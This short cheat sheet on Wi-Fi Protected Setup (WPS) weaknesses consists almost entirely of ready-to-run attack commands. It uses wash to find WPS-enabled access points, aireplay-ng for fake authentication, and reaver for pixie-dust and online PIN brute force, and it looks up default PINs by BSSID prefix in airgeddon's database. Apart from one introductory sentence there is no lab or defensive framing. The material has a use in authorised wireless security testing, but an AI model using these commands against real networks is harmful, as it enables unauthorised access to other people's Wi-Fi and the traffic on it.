Wi-Fi Protected Setup was originally known as Wi-Fi Simple Configuration, aiming to unify vendor technologies for secure WPA/WPA2 passphrase sharing. However, it has its set of vulnerabilities. Below are the steps to identify and exploit WPS vulnerabilities:

### Identifying access points with WPS enabled
```bash
wash -i <INTERFACE> -s
```
### Fake authentication attack
```bash
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>
```
### Offline brute force (pixie dust)
```bash
reaver -i wlan0 -b BSSID -SNLAvv  -c 1 -K
```
### Online brute force 
```bash
reaver -i <INTERFACE> -b <BSSID> -SNLAsvv -d 1 -r 5:3 -c <CHANNEL_NUMBER>
```

## Default pin depending on first three bytes of BSSID
```bash
sudo apt install airgeddon
source /usr/share/airgeddon/known_pins.db
echo ${PINDB["0013F7"]}
```
